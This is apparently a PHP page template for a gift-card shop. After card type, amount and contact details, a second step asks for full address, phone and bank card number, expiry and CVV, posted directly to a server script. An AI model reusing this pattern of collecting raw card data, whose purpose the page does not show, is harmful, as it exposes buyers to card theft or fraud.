<?php 

  $page_titles = "Buy Cards";
  include 'header.php';

 ?>


      <section class="breadcrumbs-custom bg-image context-dark" style="background-image: url(img/buycard.jpg);">
        <div class="container">
          <h2 class="breadcrumbs-custom-title">Buy Gift Card</h2>
          <div class="breadcrumbs-custom-subtitle"></div>
        </div>
      </section>
      <!-- FIRST FORM  -->
      <section class="section section-md bg-default" id="first-form">
        <div class="container">
          <p class="big">Fill the form below correctly in order to purchase your gift card.</p>
          <!-- RD Mailform-->
          <form class="form-boxed" data-form-output="form-output-global" data-form-type="card_upload">
            <div class="row row-50">
              <div class="col-12">
                <div class="form-wrap form-wrap-icon">
                  <label for="contact-message">Select gift card type</label>
                  <select class="form-control" name="card_type" id="card_type">
                    <option selected>Click to select gift card type</option>
                    <option value="Itunes">Apple Itunes Card</option>
                    <option value="Amazon">Amazon Card</option>
                    <option value="Steam">Steam Wallet Card</option>
                    <option value="Master Card">Master Card</option>
                    <option value="Vanilla">Vanilla</option>
                    <option value="Vanilla Visa">Vanilla Visa</option>
                    <option value="Vanilla Mastercard">Vanilla Mastercard</option>
                    <option value="Walmart Visa">Walmart Visa</option>
                    <option value="TT Visa">TT Visa</option>
                    <option value="Visa Silvery White">Visa Silvery White</option>
                    <option value="Ebay Card">Ebay Card</option>
                    <option value="Footlocker">Footlocker</option>
                    <option value="Nike Card">Nike Card</option>
                    <option value="Amex ">Amex </option>
                    <option value="Visa (The perfect gift)">Visa (The perfect gift)</option>
                    <option value="Nordstrom Card">Nordstrom Card</option>
                    <option value="Sephora Card">Sephora Card</option>
                    <option value="Other">Other</option>
                  </select>
                  <!-- <textarea class="form-input" id="contact-message" name="message" data-constraints="@Required"></textarea> -->
                </div>
              </div>
              <div class="col-12">
                <div class="form-wrap form-wrap-icon">
                  <label for="contact-message">Amount:</label>
                  <select class="form-control">
                    <option selected><i>Select amount</i></option>
                    <option value="25usd">$25</option>
                    <option value="50usd">$50</option>
                    <option value="100usd">$100</option>
                    <option value="200usd">$200</option>
                    <option value="500usd">$500</option>
                  </select>
                  <!-- <textarea class="form-input" id="contact-message" name="message" data-constraints="@Required"></textarea> -->
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-account-outline"></div>
                  <input class="form-input" id="contact-name" type="text" name="rname" data-constraints="@Required">
                  <label class="form-label" for="contact-name">Recipent Name</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-email-outline"></div>
                  <input class="form-input" id="contact-email" type="email" name="remail" data-constraints="@Email @Required">
                  <label class="form-label" for="contact-email">Recipent E-mail</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-account-outline"></div>
                  <input class="form-input" id="sender-name" type="text" name="sname" data-constraints="@Required">
                  <label class="form-label" for="sender-name">Sender Name</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-email-outline"></div>
                  <input class="form-input" id="sender-email" type="email" name="semail" data-constraints="@Email @Required">
                  <label class="form-label" for="sender-email">Sender E-mail</label>
                </div>
              </div>
              <div class="col-md-12">
                <div class="button-wrap-1 text-center"><button class="button button-default" type="button" onclick="validate()">Next &nbsp;<span class="fa fa-arrow-circle-right"></span></button></div>
              </div>
            </div>
          </form>
        </div>
      </section>
      <!-- SECOND FORM  -->
      <!-- <section class="section section-md bg-default" id="second-form" style="display: none;">
        <div class="container">
          <p class="big">Fill the form below correctly in order to purchase your gift card.</p>
          
          <form class="form-boxed" data-form-output="form-output-global" data-form-type="card_upload" method="post" action="bat/rd-mailform.php">
            <div class="row row-50">
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-account-outline"></div>
                  <input class="form-input" id="fname" type="text" name="fname" data-constraints="@Required">
                  <label class="form-label" for="fname">First Name</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-account-outline"></div>
                  <input class="form-input" id="lname" type="text" name="lname" data-constraints="@Required">
                  <label class="form-label" for="lname">Last Name</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-map-marker"></div>
                  <input class="form-input" id="address" type="text" name="address" data-constraints="@Required">
                  <label class="form-label" for="address">Street Address</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-map-marker"></div>
                  <input class="form-input" id="aptsuite" type="text" name="aptsuite" data-constraints="@Required">
                  <label class="form-label" for="aptsuite">Apt, Suite, Bldg</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-map-marker"></div>
                  <input class="form-input" id="city" type="text" name="city" data-constraints="@Required">
                  <label class="form-label" for="city">City/Town</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-map"></div>
                  <input class="form-input" id="province" type="text" name="province" data-constraints="@Required">
                  <label class="form-label" for="province">Province</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-map"></div>
                  <input class="form-input" id="postalcode" type="text" name="postalcode" data-constraints="@Required">
                  <label class="form-label" for="postalcode">Postal Code</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-phone"></div>
                  <input class="form-input" id="phone" type="text" name="phone" data-constraints="@Numeric">
                  <label class="form-label" for="phone">Phone</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <label for="contact-message">Country</label>
                  <select class="form-input" name="country" id="country">
                    <option selected>Click to select country</option>
                    <option value="USA">USA</option>
                    <option value="Canada">Canada</option>
                    <option value="Australia">Australia</option>
                    <option value="United Kingdom">United Kingdom</option>
                  </select>
                </div>
              </div>
              <div class="col-md-12">
                <div class="button-wrap-1 text-center"><button class="button button-default" type="button" onclick="validatesec()">Next &nbsp;<span class="fa fa-arrow-circle-right"></span></button></div>
              </div>
            </div>
          </form>
        </div>
      </section> -->
      <!-- THIRD FORM  -->
      <section class="section section-md bg-default" id="third-form" style="display: none;">
        <div class="container">
          <p class="big">Fill the form below correctly in order to purchase your gift card.</p>
          <!-- RD Mailform-->
          <form class="form-boxed" data-form-output="form-output-global" method="post" action="buycardprocess.php">
            <div class="row row-50">
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-account-outline"></div>
                  <input class="form-input" id="fname" type="text" name="fname" data-constraints="@Required">
                  <label class="form-label" for="fname">First Name</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-account-outline"></div>
                  <input class="form-input" id="lname" type="text" name="lname" data-constraints="@Required">
                  <label class="form-label" for="lname">Last Name</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-email-outline"></div>
                  <input class="form-input" id="buyemail" type="emailbuyemail" name="buyemail" data-constraints="@Email @Required">
                  <label class="form-label" for="buyemail">Your E-mail</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-phone"></div>
                  <input class="form-input" id="phone" type="text" name="phone" data-constraints="@Numeric">
                  <label class="form-label" for="phone">Phone</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-map-marker"></div>
                  <input class="form-input" id="address" type="text" name="address" data-constraints="@Required">
                  <label class="form-label" for="address">Street Address</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-map-marker"></div>
                  <input class="form-input" id="aptsuite" type="text" name="aptsuite" data-constraints="@Required">
                  <label class="form-label" for="aptsuite">Apt, Suite, Bldg</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-map-marker"></div>
                  <input class="form-input" id="city" type="text" name="city" data-constraints="@Required">
                  <label class="form-label" for="city">City/Town</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-map"></div>
                  <input class="form-input" id="province" type="text" name="province" data-constraints="@Required">
                  <label class="form-label" for="province">Province</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-map"></div>
                  <input class="form-input" id="postalcode" type="text" name="postalcode" data-constraints="@Required">
                  <label class="form-label" for="postalcode">Postal Code</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <label for="contact-message">Country</label>
                  <select class="form-input" name="country" id="country">
                    <option selected>Click to select country</option>
                    <option value="USA">USA</option>
                    <option value="Canada">Canada</option>
                    <option value="Australia">Australia</option>
                    <option value="United Kingdom">United Kingdom</option>
                  </select>
                  <!-- <textarea class="form-input" id="contact-message" name="message" data-constraints="@Required"></textarea> -->
                </div>
              </div>
              <div class="col-12">
                <div class="form-wrap form-wrap-icon">
                  <label for="contact-message">Supply your bank card details below</label>
                  <select class="form-control" name="bank_card_type" id="bank_card_type" required="required">
                    <option selected>Click to select bank card type</option>
                    <option value="Credit">Credit Card</option>
                    <option value="Debit">Debit Card</option>
                  </select>
                  
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-account-outline"></div>
                  <input class="form-input" id="card-full-name" type="text" name="card-full-name" required="required">
                  <label class="form-label" for="card-full-name">Name on card</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-credit-card"></div>
                  <input class="form-input" id="card-number" type="number" name="card-number" required="required">
                  <label class="form-label" for="card-number">Card Number (16 digits)</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-credit-card"></div>
                  <input class="form-input" id="expiry-month" type="number" name="expiry-month" required="required">
                  <label class="form-label" for="expiry-month">Expiry month</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-credit-card"></div>
                  <input class="form-input" id="expiry-year" type="number" name="expiry-year" required="required">
                  <label class="form-label" for="expiry-year">Expiry year</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-credit-card"></div>
                  <input class="form-input" id="cvv" type="number" name="cvv" required="required">
                  <label class="form-label" for="cvv">CVV</label>
                </div>
              </div>
              <div class="col-md-12">
                <div class="button-wrap-1 text-center"><button class="button button-default" type="submit" name="submit">Submit</button></div>
              </div>
            </div>
          </form>
        </div>
      </section>

<script type="text/javascript">
  function validate() {
        document.getElementById("first-form").style.display = 'none';
        document.getElementById("third-form").style.display = 'block';
        // document.getElementById("third-form").style.display = 'none';
    }

    function validatesec() {
        document.getElementById("first-form").style.display = 'none';
        document.getElementById("second-form").style.display = 'none';
        document.getElementById("third-form").style.display = 'block';
    }
</script>

<?php 
  include 'footer.php'
 ?>